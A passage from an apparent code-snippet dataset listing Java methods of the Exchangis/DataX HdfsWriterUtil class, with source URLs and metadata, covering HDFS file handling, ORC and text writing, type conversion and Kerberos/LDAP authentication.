fileSystem.mkdirs(path);        }catch(IOException e){            String message = String.format(\"Occurred IO error while creating directory %s\", path.toString());            LOG.error(message);            throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "deleteFiles", "params": ["Path"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void deleteFiles(Path[] paths) {        for (int i = 0; i < paths.length; i++) {            LOG.info(String.format(\"delete file [%s].\", paths[i].toString()));            try {                fileSystem.delete(paths[i], true);            } catch (IOException e) {                String message = String.format(\"\u5220\u9664\u6587\u4ef6[%s]\u65f6\u53d1\u751fIO\u5f02\u5e38,\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u662f\u5426\u6b63\u5e38\uff01\",                        paths[i].toString());                LOG.error(message);                throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);            }        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "deleteDir", "params": ["Path"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void deleteDir(Path path) {        LOG.info(String.format(\"start delete tmp dir [%s] .\", path.toString()));        try {            if (isPathexists(path.toString())) {                fileSystem.delete(path, true);            }        } catch (Exception e) {            String message = String.format(\"\u5220\u9664\u4e34\u65f6\u76ee\u5f55[%s]\u65f6\u53d1\u751fIO\u5f02\u5e38,\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u662f\u5426\u6b63\u5e38\uff01\", path.toString());            LOG.error(message);            throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);        }        LOG.info(String.format(\"finish delete tmp dir [%s] .\", path.toString()));    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "renameFile", "params": ["HashSet<String>", "HashSet<String>"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void renameFile(HashSet<String> tmpFiles, HashSet<String> endFiles) {        Path tmpFilesParent = null;        if (tmpFiles.size() != endFiles.size()) {            String message = String.format(\"\u4e34\u65f6\u76ee\u5f55\u4e0b\u6587\u4ef6\u540d\u4e2a\u6570\u4e0e\u76ee\u6807\u6587\u4ef6\u540d\u4e2a\u6570\u4e0d\u4e00\u81f4!\");            LOG.error(message);            throw DataXException.asDataXException(HdfsWriterErrorCode.HDFS_RENAME_FILE_ERROR, message);        } else {            try {                for (Iterator it1 = tmpFiles.iterator(), it2 = endFiles.iterator(); it1.hasNext() && it2.hasNext(); ) {                    String srcFile = it1.next().toString();                    String dstFile = it2.next().toString();                    Path srcFilePah = new Path(srcFile);                    Path dstFilePah = new Path(dstFile);                    if (tmpFilesParent == null) {                        tmpFilesParent = srcFilePah.getParent();                    }                    LOG.info(String.format(\"start rename file [%s] to file [%s].\", srcFile, dstFile));                    boolean renameTag = false;                    long fileLen = fileSystem.getFileStatus(srcFilePah).getLen();                    if (fileLen > 0) {                        renameTag = fileSystem.rename(srcFilePah, dstFilePah);                        if (!renameTag) {                            String message = String.format(\"\u91cd\u547d\u540d\u6587\u4ef6[%s]\u5931\u8d25,\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u662f\u5426\u6b63\u5e38\uff01\", srcFile);                            LOG.error(message);                            throw DataXException.asDataXException(HdfsWriterErrorCode.HDFS_RENAME_FILE_ERROR, message);                        }                        LOG.info(String.format(\"finish rename file [%s] to file [%s].\", srcFile, dstFile));                    } else {                        LOG.info(String.format(\"\u6587\u4ef6\uff3b%s\uff3d\u5185\u5bb9\u4e3a\u7a7a,\u8bf7\u68c0\u67e5\u5199\u5165\u662f\u5426\u6b63\u5e38\uff01\", srcFile));                    }                }            } catch (Exception e) {                String message = String.format(\"\u91cd\u547d\u540d\u6587\u4ef6\u65f6\u53d1\u751f\u5f02\u5e38,\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u662f\u5426\u6b63\u5e38\uff01\");                LOG.error(message);                throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);            } finally {                deleteDir(tmpFilesParent);            }        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "moveToDirectory", "params": ["List<String>", "String"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void moveToDirectory(List<String> srcPaths, String destPath){        try{            Path dest = new Path(destPath);            if(!fileSystem.exists(dest)){                fileSystem.mkdirs(dest);            }else if(!fileSystem.isDirectory(dest)){                String message = String.format(\"move to directory error, %s is not a directory\", destPath);                LOG.error(message);                throw DataXException.asDataXException(HdfsWriterErrorCode.HDFS_RENAME_FILE_ERROR, message);            }            for(String srcPath : srcPaths){                if(srcPath.endsWith(String.valueOf(IOUtils.DIR_SEPARATOR_UNIX))){                    srcPath = srcPath.substring(0, srcPath.length() - 1);                }                Path path = new Path(srcPath);                String destName = path.getName();                StringBuilder destPathBuilder = new StringBuilder(destPath);                if(!destPathBuilder.toString().endsWith(String.valueOf(IOUtils.DIR_SEPARATOR_UNIX))){                    destPathBuilder.append(IOUtils.DIR_SEPARATOR_UNIX);                }                destPathBuilder.append(destName);                if(fileSystem.isDirectory(path)) {                    moveToDirectory(Arrays.asList(hdfsDirList(path.toString())), destPathBuilder.toString());                }else{                    Path destFilePath = new Path(destPathBuilder.toString());                    if(fileSystem.exists(destFilePath)){                        fileSystem.delete(destFilePath, false);                    }                    fileSystem.rename(path, destFilePath);                }            }        }catch(Exception e){            String message = String.format(\"occurred error while move srcPaths : %s to destPath: %s ,please check your network\",                    JSON.toJSONString(srcPaths), destPath);            LOG.error(message);            throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "closeFileSystem", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void closeFileSystem() {        try {            fileSystem.close();        } catch (IOException e) {            String message = \"\u5173\u95edFileSystem\u65f6\u53d1\u751fIO\u5f02\u5e38,\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u662f\u5426\u6b63\u5e38\uff01\";            LOG.error(message);            throw DataXException.asDataXException(HdfsWriterErrorCode.CONNECT_HDFS_IO_ERROR, e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOutputStream", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "FSDataOutputStream", "snippet": "    public FSDataOutputStream getOutputStream(String path) {        Path storePath = new Path(path);        FSDataOutputStream fSDataOutputStream = null;        try {            fSDataOutputStream = fileSystem.create(storePath);        } catch (IOException e) {            String message = String.format(\"Create an FSDataOutputStream at the indicated Path[%s] failed: [%s]\",                    \"message:path =\" + path, e.getMessage());            LOG.error(message);            throw DataXException.asDataXException(HdfsWriterErrorCode.WRITE_FILE_IO_ERROR, e);        }        return fSDataOutputStream;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "textFileStartWrite", "params": ["RecordReceiver", "Configuration", "String", "TaskPluginCollector"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void textFileStartWrite(RecordReceiver lineReceiver, Configuration config, String fileName,                            TaskPluginCollector taskPluginCollector) {        String fieldDelimiter = config.getString(Key.FIELD_DELIMITER);        List<Configuration> columns = config.getListConfiguration(Key.COLUMN);        String compress = config.getString(Key.COMPRESS, null);        SimpleDateFormat dateFormat = new SimpleDateFormat(\"yyyyMMddHHmm\");        String attempt = \"attempt_\" + dateFormat.format(new Date()) + \"_0001_m_000000_0\";        Path outputPath = new Path(fileName);        //todo \u9700\u8981\u8fdb\u4e00\u6b65\u786e\u5b9aTASK_ATTEMPT_ID        conf.set(JobContext.TASK_ATTEMPT_ID, attempt);        FileOutputFormat outFormat = new TextOutputFormat();        FileOutputFormat.setOutputPath(conf, outputPath);        FileOutputFormat.setWorkOutputPath(conf, outputPath);        if (null != compress) {            Class<? extends CompressionCodec> codecClass = getCompressCodec(compress);            if (null != codecClass) {                FileOutputFormat.setOutputCompressorClass(conf, codecClass);            }        }        try {            RecordWriter writer = outFormat.getRecordWriter(fileSystem, conf, outputPath.toString(), Reporter.NULL);            Record record = null;            while ((record = lineReceiver.getFromReader()) != null) {                MutablePair<Text, Boolean> transportResult = transportOneRecord(record, fieldDelimiter, columns, taskPluginCollector);                if (!transportResult.getRight()) {                    writer.write(NullWritable.get(), transportResult.getLeft());                }            }            writer.close(Reporter.NULL);        } catch (Exception e) {            String message = String.format(\"\u5199\u6587\u4ef6\u6587\u4ef6[%s]\u65f6\u53d1\u751fIO\u5f02\u5e38,\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u662f\u5426\u6b63\u5e38\uff01\", fileName);            LOG.error(message);            Path path = new Path(fileName);            deleteDir(path.getParent());            throw DataXException.asDataXException(HdfsWriterErrorCode.WRITE_FILE_IO_ERROR, e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "transportOneRecord", "params": ["Record", "String", "List<Configuration>", "TaskPluginCollector"], "throws": null, "modifiers": ["private", "static"], "return_type": "MutablePair<Text,Boolean>", "snippet": "    private static MutablePair<Text, Boolean> transportOneRecord(            Record record, String fieldDelimiter, List<Configuration> columnsConfiguration, TaskPluginCollector taskPluginCollector) {        MutablePair<List<Object>, Boolean> transportResultList = transportOneRecord(record, columnsConfiguration, taskPluginCollector);        //\u4fdd\u5b58<\u8f6c\u6362\u540e\u7684\u6570\u636e,\u662f\u5426\u662f\u810f\u6570\u636e>        MutablePair<Text, Boolean> transportResult = new MutablePair<Text, Boolean>();        transportResult.setRight(false);        if (null != transportResultList) {            Text recordResult = new Text(StringUtils.join(transportResultList.getLeft(), fieldDelimiter));            transportResult.setRight(transportResultList.getRight());            transportResult.setLeft(recordResult);        }        return transportResult;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCompressCodec", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Class<CompressionCodec>", "snippet": "    private Class<? extends CompressionCodec> getCompressCodec(String compress) {        Class<? extends CompressionCodec> codecClass = null;        if (null == compress) {            codecClass = null;        } else if (\"GZIP\".equalsIgnoreCase(compress)) {            codecClass = org.apache.hadoop.io.compress.GzipCodec.class;        } else if (\"BZIP2\".equalsIgnoreCase(compress)) {            codecClass = org.apache.hadoop.io.compress.BZip2Codec.class;        } else if (\"SNAPPY\".equalsIgnoreCase(compress)) {            //todo \u7b49\u9700\u6c42\u660e\u786e\u540e\u652f\u6301 \u9700\u8981\u7528\u6237\u5b89\u88c5SnappyCodec            codecClass = org.apache.hadoop.io.compress.SnappyCodec.class;            // org.apache.hadoop.hive.ql.io.orc.ZlibCodec.class  not static            //codecClass = org.apache.hadoop.hive.ql.io.orc.ZlibCodec.class;        } else {            throw DataXException.asDataXException(HdfsWriterErrorCode.ILLEGAL_VALUE,                    String.format(\"\u76ee\u524d\u4e0d\u652f\u6301\u60a8\u914d\u7f6e\u7684 compress \u6a21\u5f0f : [%s]\", compress));        }        return codecClass;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "orcFileStartWrite", "params": ["RecordReceiver", "Configuration", "String", "TaskPluginCollector"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void orcFileStartWrite(RecordReceiver lineReceiver, Configuration config, String fileName,                           TaskPluginCollector taskPluginCollector) {        List<Configuration> columns = config.getListConfiguration(Key.COLUMN);        String compress = config.getString(Key.COMPRESS, null);        OrcSerde orcSerde = new OrcSerde();        FileOutputFormat outFormat = new OrcOutputFormat();        if (!\"NONE\".equalsIgnoreCase(compress) && null != compress) {            Class<? extends CompressionCodec> codecClass = getCompressCodec(compress);            if (null != codecClass) {                FileOutputFormat.setOutputCompressorClass(conf, codecClass);            }        }        try {            RecordWriter writer = outFormat.getRecordWriter(fileSystem, conf, fileName, Reporter.NULL);            Record record = null;            StructObjectInspector inspector =  null;            while ((record = lineReceiver.getFromReader()) != null) {                MutablePair<List<Object>, Boolean> transportResult = transportOneRecord(record, columns, taskPluginCollector);                int length = record.getColumnNumber();                if(null == inspector){                    if(null == columns){                        columns = new ArrayList<>();                        for(int i = 0; i < length; i ++){                            columns.add(Configuration.from(String.format(DEFAULT_COLUMN_CONFIG, i)));                        }                    }                    List<String> columnNames = getColumnNames(columns);                    List<ObjectInspector> columnTypeInspectors = getColumnTypeInspectors(columns);                    inspector = ObjectInspectorFactory                            .getStandardStructObjectInspector(columnNames, columnTypeInspectors);                }                if (!transportResult.getRight() && null != writer) {                    transformOrcStruct(transportResult, columns);                    writer.write(NullWritable.get(), orcSerde.serialize(transportResult.getLeft(), inspector));                }            }            writer.close(Reporter.NULL);        } catch (Exception e) {            String message = String.format(\"\u5199\u6587\u4ef6\u6587\u4ef6[%s]\u65f6\u53d1\u751fIO\u5f02\u5e38,\u8bf7\u68c0\u67e5\u60a8\u7684\u7f51\u7edc\u662f\u5426\u6b63\u5e38\uff01\", fileName);            LOG.error(message);            Path path = new Path(fileName);            deleteDir(path.getParent());            throw DataXException.asDataXException(HdfsWriterErrorCode.WRITE_FILE_IO_ERROR, e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getColumnNames", "params": ["List<Configuration>"], "throws": null, "modifiers": ["private"], "return_type": "List<String>", "snippet": "    private List<String> getColumnNames(List<Configuration> columns) {        List<String> columnNames = Lists.newArrayList();        if(null != columns) {            for (Configuration eachColumnConf : columns) {                columnNames.add(eachColumnConf.getString(Key.NAME));            }        }        return columnNames;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getColumnTypeInspectors", "params": ["List<Configuration>"], "throws": null, "modifiers": ["private"], "return_type": "List<ObjectInspector>", "snippet": "    private List<ObjectInspector> getColumnTypeInspectors(List<Configuration> columns) {        List<ObjectInspector> columnTypeInspectors = Lists.newArrayList();        if(null != columns) {            for (Configuration eachColumnConf : columns) {                SupportHiveDataType columnType = SupportHiveDataType.valueOf(eachColumnConf.getString(Key.TYPE).toUpperCase());                ObjectInspector objectInspector = null;                switch (columnType) {                    case TINYINT:                        objectInspector = ObjectInspectorFactory.getReflectionObjectInspector(Byte.class, ObjectInspectorFactory.ObjectInspectorOptions.JAVA);                        break;                    case SMALLINT:                        objectInspector = ObjectInspectorFactory.getReflectionObjectInspector(Short.class, ObjectInspectorFactory.ObjectInspectorOptions.JAVA);                        break;                    case INT:                        objectInspector = ObjectInspectorFactory.getReflectionObjectInspector(Integer.class, ObjectInspectorFactory.ObjectInspectorOptions.JAVA);                        break;                    case BIGINT:                        objectInspector = ObjectInspectorFactory.getReflectionObjectInspector(Long.class, ObjectInspectorFactory.ObjectInspectorOptions.JAVA);                        break;                    case FLOAT:                        objectInspector = ObjectInspectorFactory.getReflectionObjectInspector(Float.class, ObjectInspectorFactory.ObjectInspectorOptions.JAVA);                        break;                    case DOUBLE:                        objectInspector = ObjectInspectorFactory.getReflectionObjectInspector(Double.class, ObjectInspectorFactory.ObjectInspectorOptions.JAVA);                        break;                    case TIMESTAMP:                        objectInspector = ObjectInspectorFactory.getReflectionObjectInspector(java.sql.Timestamp.class, ObjectInspectorFactory.ObjectInspectorOptions.JAVA);                        break;                    case DATE:                        objectInspector = ObjectInspectorFactory.getReflectionObjectInspector(java.sql.Date.class, ObjectInspectorFactory.ObjectInspectorOptions.JAVA);                        break;                    case STRING:                    case VARCHAR:                    case CHAR:                        objectInspector = ObjectInspectorFactory.getReflectionObjectInspector(String.class, ObjectInspectorFactory.ObjectInspectorOptions.JAVA);                        break;                    case BOOLEAN:                        objectInspector = ObjectInspectorFactory.getReflectionObjectInspector(Boolean.class, ObjectInspectorFactory.ObjectInspectorOptions.JAVA);                        break;                    case MAP:                        objectInspector = OrcStruct.createObjectInspector(                                TypeInfoFactory.getMapTypeInfo(TypeInfoFactory.stringTypeInfo, TypeInfoFactory.stringTypeInfo));                        break;                    case ARRAY:                        objectInspector = OrcStruct.createObjectInspector(TypeInfoFactory.getListTypeInfo(TypeInfoFactory.stringTypeInfo));                        break;                    default:                        throw DataXException                                .asDataXException(                                        HdfsWriterErrorCode.ILLEGAL_VALUE,                                        String.format(                                                \"\u60a8\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u5217\u914d\u7f6e\u4fe1\u606f\u6709\u8bef. \u56e0\u4e3aDataX \u4e0d\u652f\u6301\u6570\u636e\u5e93\u5199\u5165\u8fd9\u79cd\u5b57\u6bb5\u7c7b\u578b. \u5b57\u6bb5\u540d:[%s], \u5b57\u6bb5\u7c7b\u578b:[%s]. \u8bf7\u4fee\u6539\u8868\u4e2d\u8be5\u5b57\u6bb5\u7684\u7c7b\u578b\u6216\u8005\u4e0d\u540c\u6b65\u8be5\u5b57\u6bb5.\",                                                eachColumnConf.getString(Key.NAME),                                                eachColumnConf.getString(Key.TYPE)));                }                columnTypeInspectors.add(objectInspector);            }        }        return columnTypeInspectors;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOrcSerde", "params": ["Configuration"], "throws": null, "modifiers": ["public"], "return_type": "OrcSerde", "snippet": "    public OrcSerde getOrcSerde(Configuration config) {        String fieldDelimiter = config.getString(Key.FIELD_DELIMITER);        String compress = config.getString(Key.COMPRESS);        String encoding = config.getString(Key.ENCODING);        OrcSerde orcSerde = new OrcSerde();        Properties properties = new Properties();        properties.setProperty(\"orc.bloom.filter.columns\", fieldDelimiter);        properties.setProperty(\"orc.compress\", compress);        properties.setProperty(\"orc.encoding.strategy\", encoding);        orcSerde.initialize(conf, properties);        return orcSerde;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "transportOneRecord", "params": ["Record", "List<Configuration>", "TaskPluginCollector"], "throws": null, "modifiers": ["private", "static"], "return_type": "MutablePair<List,Boolean>", "snippet": "    private static MutablePair<List<Object>, Boolean> transportOneRecord(            Record record, List<Configuration> columnsConfiguration,            TaskPluginCollector taskPluginCollector) {        MutablePair<List<Object>, Boolean> transportResult = new MutablePair<List<Object>, Boolean>();        transportResult.setRight(false);        List<Object> recordList = Lists.newArrayList();        int recordLength = record.getColumnNumber();        if (0 != recordLength) {            Column column;            for (int i = 0; i < recordLength; i++) {                column = record.getColumn(i);                if (null != column.getRawData()) {                    if(null == columnsConfiguration){                        recordList.add(column.asString());                        continue;                    }                    String rowData = column.getRawData().toString();                    SupportHiveDataType columnType = SupportHiveDataType.valueOf(                            columnsConfiguration.get(i).getString(Key.TYPE).toUpperCase());                    //\u6839\u636ewriter\u7aef\u7c7b\u578b\u914d\u7f6e\u505a\u7c7b\u578b\u8f6c\u6362                    try {                        switch (columnType) {                            case TINYINT:                                recordList.add(Byte.valueOf(rowData));                                break;                            case SMALLINT:                                recordList.add(Short.valueOf(rowData));                                break;                            case INT:                                recordList.add(Integer.valueOf(rowData));                                break;                            case BIGINT:                                recordList.add(column.asLong());                                break;                            case FLOAT:                                recordList.add(Float.valueOf(rowData));                                break;                            case DOUBLE:                                recordList.add(column.asDouble());                                break;                            case STRING:                            case VARCHAR:                            case ARRAY:                            case MAP:                            case CHAR:                                recordList.add(column.asString());                                break;                            case BOOLEAN:                                recordList.add(column.asBoolean());                                break;                            case DATE:                                recordList.add(new java.sql.Date(column.asDate().getTime()));                                break;                            case TIMESTAMP:                                recordList.add(new java.sql.Timestamp(column.asDate().getTime()));                                break;                            default:                                throw DataXException                                        .asDataXException(                                                HdfsWriterErrorCode.ILLEGAL_VALUE,                                                String.format(                                                        \"\u60a8\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u5217\u914d\u7f6e\u4fe1\u606f\u6709\u8bef. \u56e0\u4e3aDataX \u4e0d\u652f\u6301\u6570\u636e\u5e93\u5199\u5165\u8fd9\u79cd\u5b57\u6bb5\u7c7b\u578b. \u5b57\u6bb5\u540d:[%s], \u5b57\u6bb5\u7c7b\u578b:[%s]. \u8bf7\u4fee\u6539\u8868\u4e2d\u8be5\u5b57\u6bb5\u7684\u7c7b\u578b\u6216\u8005\u4e0d\u540c\u6b65\u8be5\u5b57\u6bb5.\",                                                        columnsConfiguration.get(i).getString(Key.NAME),                                                        columnsConfiguration.get(i).getString(Key.TYPE)));                        }                    } catch (Exception e) {                        // warn: \u6b64\u5904\u8ba4\u4e3a\u810f\u6570\u636e                        String message = String.format(                                \"\u5b57\u6bb5\u7c7b\u578b\u8f6c\u6362\u9519\u8bef\uff1a\u4f60\u76ee\u6807\u5b57\u6bb5\u4e3a[%s]\u7c7b\u578b\uff0c\u5b9e\u9645\u5b57\u6bb5\u503c\u4e3a[%s].\",                                columnsConfiguration.get(i).getString(Key.TYPE), column.getRawData().toString());                        taskPluginCollector.collectDirtyRecord(record, message);                        transportResult.setRight(true);                        break;                    }                } else {                    // warn: it's all ok if nullFormat is null                    recordList.add(null);                }            }        }        transportResult.setLeft(recordList);        return transportResult;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUgiByKerberos", "params": ["org", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "UserGroupInformation", "snippet": "    private UserGroupInformation getUgiByKerberos(            org.apache.hadoop.conf.Configuration conf,            String kerberosPrincipal, String kerberosKeytabFilePath){        return kerberosAuthentication(conf, kerberosPrincipal, kerberosKeytabFilePath);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getUgiInAuth", "params": ["Configuration"], "throws": null, "modifiers": ["private"], "return_type": "UserGroupInformation", "snippet": "    private UserGroupInformation getUgiInAuth(Configuration taskConfig){        String userName = taskConfig.getString(Key.LDAP_USERNAME, \"\");        String password = taskConfig.getString(Key.LDAP_USERPASSWORD, \"\");        if(StringUtils.isNotBlank(userName) && StringUtils.isNotBlank(password)) {            try {                password = (String) CryptoUtils.string2Object(password);            } catch (Exception e) {                LOG.error(\"Fail to decrypt password\", e);                throw DataXException.asDataXException(HdfsWriterErrorCode.CONFIG_INVALID_EXCEPTION, e);            }            Properties properties = null;            try {                properties = LdapUtil.getLdapProperties();            }catch(Exception e){                //Ignore            }            if(null != properties){                LdapConnector ldapConnector = LdapConnector.getInstance(properties);                if(!ldapConnector.authenticate(userName, password)){                    throw DataXException.asDataXException(HdfsWriterErrorCode.CONFIG_INVALID_EXCEPTION, \"LDAP authenticate fail\");                }            }else{                throw DataXException.asDataXException(HdfsWriterErrorCode.CONFIG_INVALID_EXCEPTION, \"Engine need LDAP configuration\");            }        }        UserGroupInformation ugi;        try {            UserGroupInformation.setConfiguration(hadoopConf);            String procUser = System.getProperty(\"user.name\", \"\");            String execUser = System.getProperty(EXEC_USER, \"\");            String remoteUser = StringUtils.isNotBlank(userName) ? userName : execUser;            if(StringUtils.isNotBlank(remoteUser) && !remoteUser.equals(procUser)){                //Disable the cache                this.hadoopConf.setBoolean(                        String.format(FS_DISABLE_CACHE, URI.create(this.hadoopConf.get(FS_DEFAULT_NAME_KEY, \"\")).getScheme()), true);                ugi = UserGroupInformation.createRemoteUser(remoteUser);            }else{                ugi = UserGroupInformation.getCurrentUser();            }        } catch (Exception e) {            LOG.error(e.getMessage());            throw DataXException.asDataXException(HdfsWriterErrorCode.HDFS_PROXY_ERROR, e);        }        return ugi;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "transformOrcStruct", "params": ["MutablePair<List,Boolean>", "List<Configuration>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void transformOrcStruct( MutablePair<List<Object>, Boolean> transportResult,                                     List<Configuration> columns){        //deal the columns whose type is MAP or ARRAY        List<Object> result = transportResult.getLeft();        for(int i = 0; i < columns.size(); i++) {            Configuration column = columns.get(i);            SupportHiveDataType columnType = SupportHiveDataType.valueOf(column.getString(Key.TYPE).toUpperCase());            String split = \",\";            if (columnType == SupportHiveDataType.ARRAY) {                String array = result.get(i).toString().trim();                if (array.startsWith(\"[\") && array.endsWith(\"]\")) {                    array = array.substring(1, array.length() - 1);                    String[] items  = array.split(split);                    for (int t = 0; t < items.length; t++){                        items[t] = StringUtils.join(new String[]{\"\\\"\",items[t] ,\"\\\"\"}, \"\");                    }                    List<String> list = JSON.parseArray(\"[\" + StringUtils.join(items, split) + \"]\", String.class);                    List<Text> listText = new ArrayList<>();                    list.forEach(value -> listText.add(new Text(value)));                    result.set(i, listText);                }            } else if (columnType == SupportHiveDataType.MAP) {                String map = result.get(i).toString().trim();                if (map.startsWith(\"{\") && map.endsWith(\"}\")) {                    map = map.substring(1, map.length() - 1);                    String[] entries = map.split(split);                    for(int t = 0; t < entries.length; t++){                        String[] attrs = entries[t].split(\"=\");                        if(attrs.length >= 2){                            entries[t] = StringUtils.join                                    (new String[]{\"\\\"\", attrs[0],\"\\\":\\\"\", attrs[1], \"\\\"\"}, \"\");                        }                    }                    Map map1 = JSON.parseObject(\"{\" + StringUtils.join(entries, split) + \"}\", Map.class);                    Map<Text, Text> mapText = new HashMap<>();                    if(null != map1) {                        map1.forEach((k, v) -> mapText.put(new Text((String) k), new Text((String) v)));                    }                    result.set(i, mapText);                }            }        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-hdfswriter/src/main/java/com/alibaba/datax/plugin/writer/hdfswriter/HdfsWriterUtil.java", "stars": "23", "class": {"name": "HdfsWriterUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getHiveConnByUris", "params": ["String"], "throws": ["IOException", "InterruptedException"], "modifiers": ["private"], "return_type": "Hive", "snippet": "    private Hive getHiveConnByUris(String hiveMetaStoreUris) throws IOException, InterruptedException {        